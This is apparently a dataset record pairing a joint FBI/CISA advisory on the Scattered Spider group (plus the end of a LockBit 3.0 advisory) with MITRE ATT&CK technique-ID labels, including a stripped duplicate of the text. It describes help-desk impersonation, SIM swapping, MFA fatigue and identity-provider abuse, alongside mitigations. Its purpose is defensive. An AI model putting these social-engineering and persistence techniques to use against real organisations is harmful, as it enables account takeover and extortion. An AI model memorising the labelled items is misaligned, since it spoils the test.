The FBI is seeking any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with LockBit 3.0 affiliates, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file. The FBI and CISA do not encourage paying ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to the FBI Internet Crime Complaint Center (IC3) at ic3.gov, local FBI Field Office, or CISA via the agency’s Incident Reporting System or its 24/7 Operations Center at report@cisa.gov or by calling 1-844-Say-CISA (1-844-729-2472).
Australian organizations that have been impacted or require assistance in regard to a ransomware incident can contact ASD’s ACSC via 1300 CYBER1 (1300 292 371), or by submitting a report to cyber.gov.au.
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. CISA and authoring organizations do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by CISA and the authoring organizations.
ACKNOWLEDGEMENTS
Boeing contributed to this CSA.
REFERENCES,1, NetScaler ADC and NetScaler Gateway Security Bulletin for CVE-2023-4966,2, What is Mshta, How Can it Be Used and How to Protect Against it (McAfee),3, Investigation of Session Hijacking via Citrix NetScaler ADC and Gateway Vulnerability (CVE-2023-4966)
VERSION HISTORY
November 21, 2023: Initial version.






This product is provided subject to this Notification and this Privacy & Use policy.


","['T1539', 'T1033', 'T1057', 'T1136', 'T1016', 'T1482', 'T1112', 'T1548', 'T1531', 'T1587', 'T1106', 'T1218', 'T1059', 'T1588', 'T1203', 'T1036', 'T1029', 'T1129', 'T1053', 'T1083', 'T1071', 'T1518', 'T1201', 'T1562', 'T1021', 'T1213', 'T1003']","{'T1574.001', 'T1003.001', 'T1548.004', 'T1539', 'T1003.003', 'T1562.003', 'T1033', 'T1021.001', 'T1055', 'T1018', 'T1136.001', 'T1548.002', 'T1556.004', 'T1563', 'T1016', 'T1070.009', 'T1036.005', 'T1595.001', 'T1059.006', 'T1555.005', 'T1556.002', 'T1218.011', 'T1074.001', 'T1556.007', 'T1562.010', 'T1059.003', 'T1110.001', 'T1590.005', 'T1588.005', 'T1106', 'T1105', 'T1550', 'T1589.002', 'T1556.008', 'T1059.001', 'T1016.001', 'T1027', 'T1070.003', 'T1562.002', 'T1009', 'T1550.003', 'T1070.001', 'T1055.001', 'T1560.001', 'T1218.005', 'T1657', 'T1083', 'T1597.001', 'T1071.001', 'T1012', 'T1036.008', 'T1596', 'T1578.004', 'T1550.004', 'T1190', 'T1486', 'T1078', 'T1201', 'T1086', 'T1614', 'T1550.001', 'T1553.006', 'T1003'}","{'T1574.001', 'T1003.001', 'T1588.002', 'T1059.003, T1136.001', 'T1003.003', 'T1548.002', 'T1016', 'T1588.001', 'T1595.001', 'T1583', 'T1070.006', 'T1059.003', 'T1588.005', 'T1550', 'T1027', 'T1580', 'T1480.001', 'T1201', 'T1086', 'T1550.001', 'T1562.003', 'T1021.001', 'T1055', 'T1018', 'T1556.004', 'T1563', 'T1556.007', 'T1590.005', 'T1012, T1119', 'T1597', 'T1562.001', 'T1485', 'T1556.008', 'T1016.001', 'T1070.005', 'T1552.001', 'T1657', 'T1078.001', 'T1003, T1021.001', 'T1596', 'T1055.001', 'T1614', 'T1553.006', 'T1111', 'T1556.002', 'T1102.002', 'T1106', 'T1203', 'T1110.004', 'T1550.003', 'T1560.001', 'T1071.001', 'T1550.004', 'T1190', 'T1098.002', 'T1486', 'T1219, T1218.005', 'T1033, T1057', 'T1583.001', 'T1539', 'T1033', 'T1136', 'T1555.005', 'T1036.005', 'T1059.006', 'T1218.011', 'T1074.001', 'T1082', 'T1105', 'T1589.002', 'T1059.001', 'T1070.003', 'T1562.002', 'T1070.001', 'T1597.001', 'T1036.008', 'T1078', 'T1518.001'}","{'T1059, T1085', 'T1070', 'T1588, T1190, T1486', 'T1589', 'T1078, T1556', 'T1033', 'T1055', 'T1595', 'T1212', 'T1595, T1486, T1071, T1489', 'T1003, T1057, T1078, T1049', 'T1098, T1078, T1053', 'T1569', 'T1078, T1059, T1082', 'T1189', 'T1218', 'T1071, T1105', 'T1219, T1059, T1203', 'T1583, T1584, T1486, T1489, T1490', 'T1059', 'T1105', 'T1550', 'T1106', 'T1609', 'T1490', 'T1203', 'T1076', 'T1059.001', 'T1029', 'T1027', 'T1003, T1012, T1005', 'T1110', 'T1218.005', 'T1074, T1105', 'T1216', 'T1078, T1505', 'T1071', 'T1556', 'T1190', 'T1486', 'T1486, T1190', 'T1078', 'T1560', 'T1210', 'T1201', 'T1562', 'T1021', 'T1554', 'T1197, T1071', 'T1078, T1071, T1550', 'T1003, T1021', 'T1555', 'T1003'}"
13,https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-320a,"



SUMMARY
The Federal Bureau of Investigation (FBI) and Cybersecurity and Infrastructure Security Agency (CISA) are releasing this joint Cybersecurity Advisory (CSA) in response to recent activity by Scattered Spider threat actors against the commercial facilities sectors and subsectors. This advisory provides tactics, techniques, and procedures (TTPs) obtained through FBI investigations as recently as November 2023.
Scattered Spider is a cybercriminal group that targets large companies and their contracted information technology (IT) help desks. Scattered Spider threat actors, per trusted third parties, have typically engaged in data theft for extortion and have also been known to utilize BlackCat/ALPHV ransomware alongside their usual TTPs.
The FBI and CISA encourage critical infrastructure organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of a cyberattack by Scattered Spider actors.
Download the PDF version of this report:


AA23-320A Scattered Spider
(PDF,       510.78 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK for Enterprise framework, version 14. See the MITRE ATT&CK® Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
Overview
Scattered Spider (also known as Starfraud, UNC3944, Scatter Swine, and Muddled Libra) engages in data extortion and several other criminal activities.[1] Scattered Spider threat actors are considered experts in social engineering and use multiple social engineering techniques, especially phishing, push bombing, and subscriber identity module (SIM) swap attacks, to obtain credentials, install remote access tools, and/or bypass multi-factor authentication (MFA). According to public reporting, Scattered Spider threat actors have [2],[3],[4]:

Posed as company IT and/or helpdesk staff using phone calls or SMS messages to obtain credentials from employees and gain access to the network [T1598],[T1656].
Posed as company IT and/or helpdesk staff to direct employees to run commercial remote access tools enabling initial access [T1204],[T1219],[T1566].
Posed as IT staff to convince employees to share their one-time password (OTP), an MFA authentication code.
Sent repeated MFA notification prompts leading to employees pressing the “Accept” button (also known as MFA fatigue) [T1621].[5]
Convinced cellular carriers to transfer control of a targeted user’s phone number to a SIM card they controlled, gaining control over the phone and access to MFA prompts.
Monetized access to victim networks in numerous ways including extortion enabled by ransomware and data theft [T1657].

After gaining access to networks, the FBI observed Scattered Spider threat actors using publicly available, legitimate remote access tunneling tools. Table 1 details a list of legitimate tools Scattered Spider, repurposed and used for their criminal activity. Note: The use of these legitimate tools alone is not indicative of criminal activity. Users should review the Scattered Spider indicators of compromise (IOCs) and TTPs discussed in this CSA to determine whether they have been compromised.

Table 1: Legitimate Tools Used by Scattered Spider


Tool
Intended Use




Fleetdeck.io
Enables remote monitoring and management of systems.


Level.io
Enables remote monitoring and management of systems.


Mimikatz [S0002]
Extracts credentials from a system.


Ngrok [S0508]
Enables remote access to a local web server by tunneling over the internet.


Pulseway
Enables remote monitoring and management of systems.


Screenconnect
Enables remote connections to network devices for management.


Splashtop
Enables remote connections to network devices for management.


Tactical.RMM
Enables remote monitoring and management of systems.


Tailscale
Provides virtual private networks (VPNs) to secure network communications.


Teamviewer
Enables remote connections to network devices for management.



In addition to using legitimate tools, Scattered Spider also uses malware as part of its TTPs. See Table 2 for some of the malware used by Scattered Spider.

Table 2: Malware Used by Scattered Spider


Malware
Use




AveMaria (also known as WarZone [S0670])
Enables remote access to a victim’s systems.


Raccoon Stealer
Steals information including login credentials [TA0006], browser history [T1217], cookies [T1539], and other data.


VIDAR Stealer
Steals information including login credentials, browser history, cookies, and other data.



Scattered Spider threat actors have historically evaded detection on target networks by using living off the land techniques and allowlisted applications to navigate victim networks, as well as frequently modifying their TTPs.
Observably, Scattered Spider threat actors have exfiltrated data [TA0010] after gaining access and threatened to release it without deploying ransomware; this includes exfiltration to multiple sites including U.S.-based data centers and MEGA[.]NZ [T1567.002].
Recent Scattered Spider TTPs
New TTP - File Encryption
More recently, the FBI has identified Scattered Spider threat actors now encrypting victim files after exfiltration [T1486]. After exfiltrating and/or encrypting data, Scattered Spider threat actors communicate with victims via TOR, Tox, email, or encrypted applications.
Reconnaissance, Resource Development, and Initial Access
Scattered Spider intrusions often begin with broad phishing [T1566] and smishing [T1660] attempts against a target using victim-specific crafted domains, such as the domains listed in Table 3 [T1583.001].

Table 3: Domains Used by Scattered Spider Threat Actors


Domains




victimname-sso[.]com


victimname-servicedesk[.]com


victimname-okta[.]com



In most instances, Scattered Spider threat actors conduct SIM swapping attacks against users that respond to the phishing/smishing attempt. The threat actors then work to identify the personally identifiable information (PII) of the most valuable users that succumbed to the phishing/smishing, obtaining answers for those users’ security questions. After identifying usernames, passwords, PII [T1589], and conducting SIM swaps, the threat actors then use social engineering techniques [T1656] to convince IT help desk personnel to reset passwords and/or MFA tokens [T1078.002],[T1199],[T1566.004] to perform account takeovers against the users in single sign-on (SSO) environments.
Execution, Persistence, and Privilege Escalation
Scattered Spider threat actors then register their own MFA tokens [T1556.006],[T1606] after compromising a user’s account to establish persistence [TA0003]. Further, the threat actors add a federated identity provider to the victim’s SSO tenant and activate automatic account linking [T1484.002]. The threat actors are then able to sign into any account by using a matching SSO account attribute. At this stage, the Scattered Spider threat actors already control the identity provider and then can choose an arbitrary value for this account attribute. As a result, this activity allows the threat actors to perform privileged escalation [TA0004] and continue logging in even when passwords are changed [T1078]. Additionally, they leverage common endpoint detection and response (EDR) tools installed on the victim networks to take advantage of the tools’ remote-shell capabilities and executing of commands which elevates their access. They also deploy remote monitoring and management (RMM) tools [T1219] to then maintain persistence.
Discovery, Lateral Movement, and Exfiltration
Once persistence is established on a target network, Scattered Spider threat actors often perform discovery, specifically searching for SharePoint sites [T1213.002], credential storage documentation [T1552.001], VMware vCenter infrastructure [T1018], backups, and instructions for setting up/logging into Virtual Private Networks (VPN) [TA0007]. The threat actors enumerate the victim’s Active Directory (AD), perform discovery and exfiltration of victim’s code repositories [T1213.003], code-signing certificates [T1552.004], and source code [T1083],[TA0010]. Threat actors activate Amazon Web Services (AWS) Systems Manager Inventory [T1538] to discover targets for lateral movement [TA0007],[TA0008], then move to both preexisting [T1021.007] and actor-created [T1578.002] Amazon Elastic Compute Cloud (EC2) instances. In instances where the ultimate goal is data exfiltration, Scattered Spider threat actors use actor-installed extract, transform, and load (ETL) tools [T1648] to bring data from multiple data sources into a centralized database [T1074],[T1530]. According to trusted third parties, where more recent incidents are concerned, Scattered Spider threat actors may have deployed BlackCat/ALPHV ransomware onto victim networks—thereby encrypting VMware Elastic Sky X integrated (ESXi) servers [T1486].
To determine if their activities have been uncovered and maintain persistence, Scattered Spider threat actors often search the victim’s Slack, Microsoft Teams, and Microsoft Exchange online for emails [T1114] or conversations regarding the threat actor’s intrusion and any security response. The threat actors frequently join incident remediation and response calls and teleconferences, likely to identify how security teams are hunting them and proactively develop new avenues of intrusion in response to victim defenses. This is sometimes achieved by creating new identities in the environment [T1136] and is often upheld with fake social media profiles [T1585.001] to backstop newly created identities.
MITRE ATT&CK TACTICS AND TECHNIQUES
See Tables 4 through 17 for all referenced threat actor tactics and techniques in this advisory.

Table 4: Reconnaissance


Technique Title
ID
Use




Gather Victim Identity Information
T1589
Scattered Spider threat actors gather usernames, passwords, and PII for targeted organizations.


Phishing for Information
T1598
Scattered Spider threat actors use phishing to obtain login credentials, gaining access to a victim’s network.




Table 5: Resource Development


Technique Title
ID
Use




Acquire Infrastructure: Domains
T1583.001
Scattered Spider threat actors create domains for use in phishing and smishing attempts against targeted organizations.


Establish Accounts: Social Media Accounts
T1585.001
Scattered Spider threat actors create fake social media profiles to backstop newly created user accounts in a targeted organization.




Table 6: Initial Access


Technique Title
ID
Use




Phishing
T1566

Scattered Spider threat actors use broad phishing attempts against a target to obtain information used to gain initial access.
Scattered Spider threat actors have posed as helpdesk personnel to direct employees to install commercial remote access tools.



Phishing (Mobile)
T1660
Scattered Spider threat actors send SMS messages, known as smishing, when targeting a victim.


Phishing: Spearphishing Voice
T1566.004
Scattered Spider threat actors use voice communications to convince IT help desk personnel to reset passwords and/or MFA tokens.


Trusted Relationship
T1199
Scattered Spider threat actors abuse trusted relationships of contracted IT help desks to gain access to targeted organizations.


Valid Accounts: Domain Accounts
T1078.002
Scattered Spider threat actors obtain access to valid domain accounts to gain initial access to a targeted organization.




Table 7: Execution


Technique Title
ID
Use




Serverless Execution
T1648
Scattered Spider threat actors use ETL tools to collect data in cloud environments.


User Execution
T1204
Scattered Spider threat actors impersonating helpdesk personnel direct employees to run commercial remote access tools thereby enabling access to the victim’s network.




Table 8: Persistence


Technique Title
ID
Use




Persistence
TA0003
Scattered Spider threat actors seek to maintain persistence on a targeted organization’s network.


Create Account
T1136
Scattered Spider threat actors create new user identities in the targeted organization.


Modify Authentication Process: Multi-Factor Authentication
T1556.006
Scattered Spider threat actors may modify MFA tokens to gain access to a victim’s network.


Valid Accounts
T1078
Scattered Spider threat actors abuse and control valid accounts to maintain network access even when passwords are changed.




Table 9: Privilege Escalation


Technique Title
ID
Use




Privilege Escalation
TA0004
Scattered Spider threat actors escalate account privileges when on a targeted organization’s network.


Domain Policy Modification: Domain Trust Modification
T1484.002
Scattered Spider threat actors add a federated identify provider to the victim’s SSO tenant and activate automatic account linking.




Table 10: Defense Evasion


Technique Title
ID
Use




Modify Cloud Compute Infrastructure: Create Cloud Instance
T1578.002
Scattered Spider threat actors will create cloud instances for use during lateral movement and data collection.


Impersonation
TA1656

Scattered Spider threat actors pose as company IT and/or helpdesk staff to gain access to victim’s networks.
Scattered Spider threat actors use social engineering to convince IT help desk personnel to reset passwords and/or MFA tokens.





Table 11: Credential Access


Technique Title
ID
Use




Credential Access
TA0006
Scattered Spider threat actors use tools, such as Raccoon Stealer, to obtain login credentials.


Forge Web Credentials
T1606
Scattered Spider threat actors may forge MFA tokens to gain access to a victim’s network.


Multi-Factor Authentication Request Generation
T1621
Scattered Spider sends repeated MFA notification prompts to lead employees to accept the prompt and gain access to the target network.


Unsecured Credentials: Credentials in Files
T1552.001
Scattered Spider threat actors search for insecurely stored credentials on victim’s systems.


Unsecured Credentials: Private Keys
T1552.004
Scattered Spider threat actors search for insecurely stored private keys on victim’s systems.




Table 12: Discovery


Technique Title
ID
Use




Discovery
TA0007
Upon gaining access to a targeted network, Scattered Spider threat actors seek out SharePoint sites, credential storage documentation, VMware vCenter, infrastructure backups and enumerate AD to identify useful information to support further operations.


Browser Information Discovery
T1217
Scattered Spider threat actors use tools (e.g., Raccoon Stealer) to obtain browser histories.


Cloud Service Dashboard
T1538
Scattered Spider threat actors leverage AWS Systems Manager Inventory to discover targets for lateral movement.


File and Directory Discovery
T1083
Scattered Spider threat actors search a compromised network to discover files and directories for further information or exploitation.


Remote System Discovery
T1018
Scattered Spider threat actors search for infrastructure, such as remote systems, to exploit.


Steal Web Session Cookie
T1539
Scattered Spider threat actors use tools, such as Raccoon Stealer, to obtain browser cookies.




Table 13: Lateral Movement


Technique Title
ID
Use




Lateral Movement
TA0008
Scattered Spider threat actors laterally move across a target network upon gaining access and establishing persistence.


Remote Services: Cloud Services
T1021.007
Scattered Spider threat actors use pre-existing cloud instances for lateral movement and data collection.




Table 14: Collection


Technique Title
ID
Use




Data from Information Repositories: Code Repositories
T1213.003
Scattered Spider threat actors search code repositories for data collection and exfiltration.


Data from Information Repositories: Sharepoint
T1213.002
Scattered Spider threat actors search SharePoint repositories for information.


Data Staged
T1074
Scattered Spider threat actors stage data from multiple data sources into a centralized database before exfiltration.


Email Collection
T1114
Scattered Spider threat actors search victim’s emails to determine if the victim has detected the intrusion and initiated any security response.


Data from Cloud Storage
T1530
Scattered Spider threat actors search data in cloud storage for collection and exfiltration.




Table 15: Command and Control


Technique Title
ID
Use




Remote Access Software
T1219

Impersonating helpdesk personnel, Scattered Spider threat actors direct employees to run commercial remote access tools thereby enabling access to and command and control of the victim’s network.
Scattered Spider threat actors leverage third-party software to facilitate lateral movement and maintain persistence on a target organization’s network.





Table 16: Exfiltration


Technique Title
ID
Use




Exfiltration
TA0010
Scattered Spider threat actors exfiltrate data from a target network to for data extortion.




Table 17: Impact


Technique Title
ID
Use




Data Encrypted for Impact
T1486

Scattered Spider threat actors recently began encrypting data on a target network and demanding a ransom for decryption.
Scattered Spider threat actors has been observed encrypting VMware ESXi servers.



Exfiltration Over Web Service: Exfiltration to Cloud Storage
T1567.002
Scattered Spider threat actors exfiltrate data to multiple sites including U.S.-based data centers and MEGA[.]NZ.


Financial Theft
T1657
Scattered Spider threat actors monetized access to victim networks in numerous ways including extortion-enabled ransomware and data theft.



MITIGATIONS
These mitigations apply to all critical infrastructure organizations and network defenders. The FBI and CISA recommend that software manufactures incorporate secure-by-design and -default principles and tactics into their software development practices limiting the impact of ransomware techniques, thus, strengthening the secure posture for their customers.
For more information on secure by design, see CISA’s Secure by Design and Default webpage and joint guide.
The FBI and CISA recommend organizations implement the mitigations below to improve your organization’s cybersecurity posture based on the threat actor activity and to reduce the risk of compromise by Scattered Spider threat actors. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.

Implement application controls to manage and control execution of software, including allowlisting remote access programs. Application controls should prevent installation and execution of portable versions of unauthorized remote access and other software. A properly configured application allowlisting solution will block any unlisted application execution. Allowlisting is important because antivirus solutions may fail to detect the execution of malicious portable executables when the files use any combination of compression, encryption, or obfuscation.
Reduce threat of malicious actors using remote access tools by:

Auditing remote access tools on your network to identify currently used and/or authorized software.
Reviewing logs for execution of remote access software to detect abnormal use of programs running as a portable executable [CPG 2.T].
Using security software to detect instances of remote access software being loaded only in memory.
Requiring authorized remote access solutions to be used only from within your network over approved remote access solutions, such as virtual private networks (VPNs) or virtual desktop interfaces (VDIs).
Blocking both inbound and outbound connections on common remote access software ports and protocols at the network perimeter.
Applying recommendations in the Guide to Securing Remote Access Software.


Implementing FIDO/WebAuthn authentication or Public Key Infrastructure (PKI)-based MFA. These MFA implementations are resistant to phishing and not suspectable to push bombing or SIM swap attacks, which are techniques known to be used by Scattered Spider actors. See CISA’s fact sheet Implementing Phishing-Resistant MFA for more information.
Strictly limit the use of Remote Desktop Protocol (RDP) and other remote desktop services. If RDP is necessary, rigorously apply best practices, for example [CPG 2.W]:

Audit the network for systems using RDP.
Close unused RDP ports.
Enforce account lockouts after a specified number of attempts.
Apply phishing-resistant multifactor authentication (MFA).
Log RDP login attempts.



In addition, the authoring authorities of this CSA recommend network defenders apply the following mitigations to limit potential adversarial use of common system and network discovery techniques, and to reduce the impact and risk of compromise by ransomware or data extortion actors:

Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (i.e., hard drive, storage device, the cloud).
Maintain offline backups of data and regularly maintain backup and restoration (daily or weekly at minimum). By instituting this practice, an organization limits the severity of disruption to its business practices [CPG 2.R].
Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with NIST's standards for developing and managing password policies.

Implement password policies in compliance with NIST’s standards.
Use “strong” passwords that are unique and random, as well as contain at least sixteen characters and no more than 64 characters in length [CPG 2.B].
Consider implementing industry-recognized password managers that align with organizational technology procurement policies.
Avoid reusing passwords [CPG 2.C].
Implement multiple failed login attempt account lockouts [CPG 2.G].
Disable password “hints.”
Refrain from requiring recurring password changes.Note: NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.
Require administrator credentials to install software.


Require phishing-resistant multifactor authentication (MFA) for all services to the extent possible, particularly for webmail, virtual private networks (VPNs), and accounts that access critical systems [CPG 2.H].
Keep all operating systems, software, and firmware up to date. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Prioritize patching known exploited vulnerabilities in internet-facing systems [CPG 1.E].
Segment networks to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement [CPG 2.F].
Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool. To aid in detecting the ransomware, implement a tool that logs and reports all network traffic and activity, including lateral movement, on a network. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host [CPG 3.A].
Install, regularly update, and enable real time detection for antivirus software on all hosts.
Disable unused ports and protocols [CPG 2.V].
Consider adding an email banner to emails received from outside your organization [CPG 2.M].
Disable hyperlinks in received emails.
Ensure all backup data is encrypted, immutable (i.e., ensure backup data cannot be altered or deleted), and covers the entire organization’s data infrastructure [CPG 2.K, 2.L, 2.R].

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, the FBI and CISA recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. The FBI and CISA recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Tables 4-17).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

The FBI and CISA recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
REPORTING
The FBI and CISA are seeking any information that can be shared, to include a sample ransom note, communications with Scattered Spider group actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file. The FBI and CISA do not encourage paying ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to a local FBI Field Office, report the incident to the FBI Internet Crime Complaint Center (IC3) at IC3.gov, or CISA via CISA’s 24/7 Operations Center (report@cisa.gov or 888-282-0870).
REFERENCES
[1] MITRE ATT&CK – Scattered Spider[2] Trellix - Scattered Spider: The Modus Operandi[3] Crowdstrike - Not a SIMulation: CrowdStrike Investigations Reveal Intrusion Campaign Targeting Telco and BPO Companies[4] Crowdstrike - SCATTERED SPIDER Exploits Windows Security Deficiencies with Bring-Your-Own-Vulnerable-Driver Tactic in Attempt to Bypass Endpoint Security[5] Malwarebytes - Ransomware group steps up, issues statement over MGM Resorts compromise
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. The FBI and CISA do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by the FBI and CISA.
VERSION HISTORY
November 16, 2023: Initial version.November 21, 2023: Updated password recommendation language on page 12.






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1213.003', 'TA0003', 'T1083', 'TA0008', 'T1484.002', 'T1657', 'T1219', 'T1660', 'T1566.004', 'T1606', 'TA0010', 'T1578.002', 'T1213.002', 'T1021.007', 'TA0006', 'T1648', 'T1656', 'T1018', 'TA1656', 'T1217', 'T1567.002', 'T1204', 'T1136', 'T1078.002', 'T1199', 'T1078', 'T1552.004', 'T1552.001', 'T1538', 'T1114', 'T1566', 'T1539', 'T1530', 'T1556.006', 'T1621', 'T1598', 'T1074', 'T1585.001', 'T1486', 'T1583.001', 'TA0004', 'T1589', 'TA0007'}","



SUMMARY
The Federal Bureau of Investigation (FBI) and Cybersecurity and Infrastructure Security Agency (CISA) are releasing this joint Cybersecurity Advisory (CSA) in response to recent activity by Scattered Spider threat actors against the commercial facilities sectors and subsectors. This advisory provides tactics, techniques, and procedures (TTPs) obtained through FBI investigations as recently as November 2023.
Scattered Spider is a cybercriminal group that targets large companies and their contracted information technology (IT) help desks. Scattered Spider threat actors, per trusted third parties, have typically engaged in data theft for extortion and have also been known to utilize BlackCat/ALPHV ransomware alongside their usual TTPs.
The FBI and CISA encourage critical infrastructure organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of a cyberattack by Scattered Spider actors.
Download the PDF version of this report:


AA23-320A Scattered Spider
(PDF,       510.78 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK for Enterprise framework, version 14. See the MITRE ATT&CK® Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
Overview
Scattered Spider (also known as Starfraud, UNC3944, Scatter Swine, and Muddled Libra) engages in data extortion and several other criminal activities.,1, Scattered Spider threat actors are considered experts in social engineering and use multiple social engineering techniques, especially phishing, push bombing, and subscriber identity module (SIM) swap attacks, to obtain credentials, install remote access tools, and/or bypass multi-factor authentication (MFA). According to public reporting, Scattered Spider threat actors have,2,3,4,:

Posed as company IT and/or helpdesk staff using phone calls or SMS messages to obtain credentials from employees and gain access to the network,.
Posed as company IT and/or helpdesk staff to direct employees to run commercial remote access tools enabling initial access,.
Posed as IT staff to convince employees to share their one-time password (OTP), an MFA authentication code.
Sent repeated MFA notification prompts leading to employees pressing the “Accept” button (also known as MFA fatigue),.,5,
Convinced cellular carriers to transfer control of a targeted user’s phone number to a SIM card they controlled, gaining control over the phone and access to MFA prompts.
Monetized access to victim networks in numerous ways including extortion enabled by ransomware and data theft,.

After gaining access to networks, the FBI observed Scattered Spider threat actors using publicly available, legitimate remote access tunneling tools. Table 1 details a list of legitimate tools Scattered Spider, repurposed and used for their criminal activity. Note: The use of these legitimate tools alone is not indicative of criminal activity. Users should review the Scattered Spider indicators of compromise (IOCs) and TTPs discussed in this CSA to determine whether they have been compromised.

In addition to using legitimate tools, Scattered Spider also uses malware as part of its TTPs. See Table 2 for some of the malware used by Scattered Spider.

Scattered Spider threat actors have historically evaded detection on target networks by using living off the land techniques and allowlisted applications to navigate victim networks, as well as frequently modifying their TTPs.
Observably, Scattered Spider threat actors have exfiltrated data, after gaining access and threatened to release it without deploying ransomware; this includes exfiltration to multiple sites including U.S.-based data centers and MEGA,.,NZ,.
Recent Scattered Spider TTPs
New TTP - File Encryption
More recently, the FBI has identified Scattered Spider threat actors now encrypting victim files after exfiltration,. After exfiltrating and/or encrypting data, Scattered Spider threat actors communicate with victims via TOR, Tox, email, or encrypted applications.
Reconnaissance, Resource Development, and Initial Access
Scattered Spider intrusions often begin with broad phishing, and smishing, attempts against a target using victim-specific crafted domains, such as the domains listed in Table 3,.

In most instances, Scattered Spider threat actors conduct SIM swapping attacks against users that respond to the phishing/smishing attempt. The threat actors then work to identify the personally identifiable information (PII) of the most valuable users that succumbed to the phishing/smishing, obtaining answers for those users’ security questions. After identifying usernames, passwords, PII, and conducting SIM swaps, the threat actors then use social engineering techniques, to convince IT help desk personnel to reset passwords and/or MFA tokens, to perform account takeovers against the users in single sign-on (SSO) environments.
Execution, Persistence, and Privilege Escalation
Scattered Spider threat actors then register their own MFA tokens, after compromising a user’s account to establish persistence,. Further, the threat actors add a federated identity provider to the victim’s SSO tenant and activate automatic account linking,. The threat actors are then able to sign into any account by using a matching SSO account attribute. At this stage, the Scattered Spider threat actors already control the identity provider and then can choose an arbitrary value for this account attribute. As a result, this activity allows the threat actors to perform privileged escalation, and continue logging in even when passwords are changed,. Additionally, they leverage common endpoint detection and response (EDR) tools installed on the victim networks to take advantage of the tools’ remote-shell capabilities and executing of commands which elevates their access. They also deploy remote monitoring and management (RMM) tools, to then maintain persistence.
Discovery, Lateral Movement, and Exfiltration
Once persistence is established on a target network, Scattered Spider threat actors often perform discovery, specifically searching for SharePoint sites, credential storage documentation, VMware vCenter infrastructure, backups, and instructions for setting up/logging into Virtual Private Networks (VPN),. The threat actors enumerate the victim’s Active Directory (AD), perform discovery and exfiltration of victim’s code repositories, code-signing certificates, and source code,. Threat actors activate Amazon Web Services (AWS) Systems Manager Inventory, to discover targets for lateral movement, then move to both preexisting, and actor-created, Amazon Elastic Compute Cloud (EC2) instances. In instances where the ultimate goal is data exfiltration, Scattered Spider threat actors use actor-installed extract, transform, and load (ETL) tools, to bring data from multiple data sources into a centralized database,. According to trusted third parties, where more recent incidents are concerned, Scattered Spider threat actors may have deployed BlackCat/ALPHV ransomware onto victim networks—thereby encrypting VMware Elastic Sky X integrated (ESXi) servers,.
To determine if their activities have been uncovered and maintain persistence, Scattered Spider threat actors often search the victim’s Slack, Microsoft Teams, and Microsoft Exchange online for emails, or conversations regarding the threat actor’s intrusion and any security response. The threat actors frequently join incident remediation and response calls and teleconferences, likely to identify how security teams are hunting them and proactively develop new avenues of intrusion in response to victim defenses. This is sometimes achieved by creating new identities in the environment, and is often upheld with fake social media profiles, to backstop newly created identities.
MITRE ATT&CK TACTICS AND TECHNIQUES
See Tables 4 through 17 for all referenced threat actor tactics and techniques in this advisory.














MITIGATIONS
